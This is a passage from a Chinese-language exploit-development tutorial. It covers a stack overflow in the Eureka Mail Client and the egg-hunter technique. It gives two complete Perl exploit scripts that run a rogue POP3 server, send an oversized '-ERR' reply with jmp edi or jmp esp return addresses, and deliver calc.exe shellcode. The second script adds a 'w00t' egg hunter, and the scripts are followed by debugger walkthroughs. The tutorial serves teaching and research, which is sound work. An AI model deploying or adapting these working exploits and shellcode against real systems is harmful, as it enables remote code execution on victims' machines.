为什么前面我使用Metasploit模式而不是2000个A做攻击字符串，现在谜底该揭晓了。当执行!pvefindaddr
suggest 命令时，插件将评估这次 Crash,寻找 Metasploit 参考，尝试找到偏移量，并找出属于哪一
种类型的exploit。最后这个插件甚至能帮我们用正确的位移构建一个攻击数据。
Life is good :-)
现在我们有了以下信息：
 这是一个直接的覆写返回值的攻击。返回值被从第710个字节处开始的内容覆盖。我还注意到覆盖返回值的位
移会随着POP3 Server主机地址（或IP地址）的长度而变化。如果你使用127.0.0.1（比192.168.0.193少4个字
节），位移值变为714.一个使exploit 更通用的方法：计算本地IP地址的长度，然后在这个长度的基础上计算最
后的位移值。（723 – IP地址的长度）。
 ESP 和 EDI 都包含一个指向 shellcode 的引用。ESP 指向第 Metasploit 模式字符串的 714 个字节处（EDI 指向第
991个字节处）。（在你的系统上可能是两个完全不同的的值）。
目前一切正常，我们可以选择跳转到EDI或ESP。
ESP 指向栈地址（0x0012cd6c）而 EDI 指向应用程序的.data 地址空间(0x00473678 ——看下面的 memory map
视图)。
仔细看一下ESP，我可以看到这里仅有很小一块空间可以用来保存我们的shellcode代码：
当然，你可一跳转到ESP处，然后在ESP处准备向后跳的代码，这样你就可以使用缓冲区中覆盖返回地址的字
节前面的较大的一块空间。但是你最多仍然只有700个字节左右的空间（当然这对启动一个计算器程序和做一些简
单的功能来说做够了）。
跳到EDI也是个不错的注意。使用” !pvefindaddr j edi”命令找到所有的”jump edi”跳板.(所有的地址都被
写入到j.txt文件中)。我将使用0x&E47B533（在XP SP3中，该地址位于user32.dll中）。修改脚本并测试这个直接覆
盖返回值的exploit是否可以工作。
use Socket;
#fill out the local IP or hostname
#which is used by Eureka EMail as POP3 server
#note : must be exact match !
my $localserver = "192.168.0.193";
#calculate offset to EIP
my $junk = "A" x (723 - length($localserver));
my $ret=pack('V',0x7E47B533); #jmp edi from user32.dll XP SP3
my $padding = "\x90" x 277;
#calc.exe
my $shellcode="\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a" .
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47" .
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c" .
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a" .
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50" .
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43" .
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a" .
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c" .
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44" .
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c" .
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47" .
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50" .
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44" .
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43" .
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42" .
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b" .
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45" .
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41";
my $payload=$junk.$ret.$padding.$shellcode;
#set up listener on port 110
my $port=110;
my $proto=getprotobyname('tcp');
socket(SERVER,PF_INET,SOCK_STREAM,$proto);
my $paddr=sockaddr_in($port,INADDR_ANY);
bind(SERVER,$paddr);
listen(SERVER,SOMAXCONN);
print "[+] Listening on tcp port 110 [POP3]... \n";
print "[+] Configure Eureka Mail Client to connect to this host\n";
my $client_addr;
while($client_addr=accept(CLIENT,SERVER))
{
print "[+] Client connected, sending evil payload\n";
while(1)
{
print CLIENT "-ERR ".$payload."\n";
print " -> Sent ".length($payload)." bytes\n";
}
}
close CLIENT;
print "[+] Connection closed\n";
把Immunity附加(attach)到Eureka上，然后在地址0x7E47B533（jmp edi）上下断点。
触发Exploit, Immunity断在jmp edi处。但是我们发现现在EDI寄存器中的值并没有指向我们的shellcode代码。
相反指向了连续的A字符。这不是我们期望的结果，不过这仍然可以达到我们的目的。这种情况其实跟使用jmp esp
差不多一样，我们仍然只有700字节左右的空间。
为了了解和学习寻蛋技术，我们这次使用一种困难的方法。虽然shellcode没有在我们期望的地方出现，但是它
仍然躲在内存的某个位置。如果我们沿着内存向下查找，我们就会在0x00473992出发现我们的shellcode.
既然这个地址是一个不确定的地址，那么需要我们的exploit具有更高的机动性。所以我们使用寻蛋技术来找到
和执行我们的shellcode.
首先跳转到esp(距离esp仅仅714个字节)，把寻蛋代码放到esp指向的地址，紧接着放置一些填充字符，然后
是我们的shellcode(已经增加了标记)„„这样无论最后shellcode被放置哪里，寻蛋代码都能找到并执行它。
寻蛋代码（这里使用的是NTAccessCheckAndAuditAlarm方法）如下：
my $egghunter =
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"\x77\x30\x30\x74". # this is the marker/tag: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
这段代码中使用 w00t 作为标记。这个 32 个字节的 shellcode（寻蛋代码）将在内存中寻找”w00tw00t”然后执
行”w00tw00t”后面的代码。所以这段代码需要放在esp处。
切记我们需要在shellcode前面放置两个连续的标记（如果只搜索一次标记，寻蛋代码很可能会误把自己当作结
果）。
首先，寻找jump 跳转到esp的指令(!pvefindaddr j esp).这里我们使用0x7E47BCAF (jmp esp) ,
这个地址属于user32.dll地址空间 (XP SP3).
修改exploit脚本来完成以下工作：
 在第710字节处用jmp sep来修改EIP的值。
 把$egghunter的内容放置在ESP处。寻蛋代码将搜索字符串“w00tw00t”
 增加一些填充物（可以是任何内容：连续的nop, 连续的字母A„„当然你不能使用w00t :) ）
 在真正的shellcode前放置”w00tw00t”
 最后就是真正的shellcode
use Socket;
#fill out the local IP or hostname
#which is used by Eureka EMail as POP3 server
#note : must be exact match !
my $localserver = "192.168.0.193";
#calculate offset to EIP
my $junk = "A" x (723 - length($localserver));
my $ret=pack('V',0x7E47BCAF); #jmp esp from user32.dll
my $padding = "\x90" x 1000;
my $egghunter =
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"\x77\x30\x30\x74". # this is the marker/tag: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
#calc.exe
my $shellcode="\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a" .
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47" .
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c" .
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a" .
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50" .
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43" .
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a" .
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c" .
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44" .
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c" .
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47" .
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50" .
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44" .
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43" .
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42" .
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b" .
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45" .
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41";
my $payload=$junk.$ret.$egghunter.$padding."w00tw00t".$shellcode;
#set up listener on port 110
my $port=110;
my $proto=getprotobyname('tcp');
socket(SERVER,PF_INET,SOCK_STREAM,$proto);
my $paddr=sockaddr_in($port,INADDR_ANY);
bind(SERVER,$paddr);
listen(SERVER,SOMAXCONN);
print "[+] Listening on tcp port 110 [POP3]... \n";
print "[+] Configure Eureka Mail Client to connect to this host\n";
my $client_addr;
while($client_addr=accept(CLIENT,SERVER))
{
print "[+] Client connected, sending evil payload\n";
while(1)
{
print CLIENT "-ERR ".$payload."\n";
print " -> Sent ".length($payload)." bytes\n";
}
}
close CLIENT;
print "[+] Connection closed\n";
附加Immunity到Eureka Mail程序，在地址0x7E47BCAF下断点，然后运行程序。
当exploit被触发时，Immunity将断在jmp esp处。
现在来查看esp值(此时跳转还没有发生)：
我们可以看到寻蛋代码位于地址0x0012cd6c
在地址0x12cd7d(move ax, 74303077)，我们找到了字符串w00t.
继续运行程序，计算器程序就会弹出来。
一切顺利！
现在来瞧瞧shellcode的藏身之地，顺便看它什么时候被执行。
在两个蛋(w00t)和shellcode之间增加一个断点（在shellcode前面再放置一个0xCC）。然后再运行exploit（别忘
了附加调试器）。
我们看到蛋和shellcode代码实际位于应用的资源段(resources section)地址空间内.
这表明寻蛋代码(位于0x12cd6c处)必须搜索到地址0x004739AD才能找到shellcode.
如果在jmp esp处下断点，可以看到栈上的内容：
尽管 shellcode 并不在寻蛋代码附近，但是寻蛋代码还是在不算长的时间里找到并执行了 shellcode。这真是太
酷了！
如果 shellcode 被保存在堆空间，我们怎么办？我们如何才能找到内存中的所有 shellcode 拷贝？如果找到
shellcode 需要非常长的时间怎么办？我们是不是可以包装寻蛋代码来从一个特定的位置开始搜索？有没有方法可
以修改寻蛋代码开始搜索的位置？有太多的问题需要解决。让我们继续前进！
包装寻蛋代码的开始搜索位置（增加趣味性、速度和可靠性）
在我们的例子中，寻蛋代码首先执行以下指令
（我们假定此时 EDX 中的值是 0x0012F468（原文中此处是 0x12E468），而蛋（即标记）位于地址 0x0012F555
附近）
0012F460 66:81CA FF0F OR DX,0FFF
0012F465 42 INC EDX
0012F466 52 PUSH EDX
0012F467 6A 02 PUSH 2
0012F469 58 POP EAX
第一条指令执行后,EDX 的值改变为 0x0012FFFF.下一条指令(INC EDX)把 edx 的值增加 1，现在 EDX 中的值是
0x00130000.这个值指向当前栈帧(Stack Frame)的结尾，所以搜索过程没有尝试搜索当前栈帧来找到一份shellcode的
拷贝（当然在前面的例子中，并没有这样的一份拷贝存在，不过这种情况仍然存在）。彩蛋和shellcode一起藏在内
存的某个角落，寻蛋代码终究会找到它。所以不存在什么问题。
但是如果shellcode的拷贝只出现在当前栈帧（这种情况很少，但并不是不会发生），那么这份寻蛋代码将无功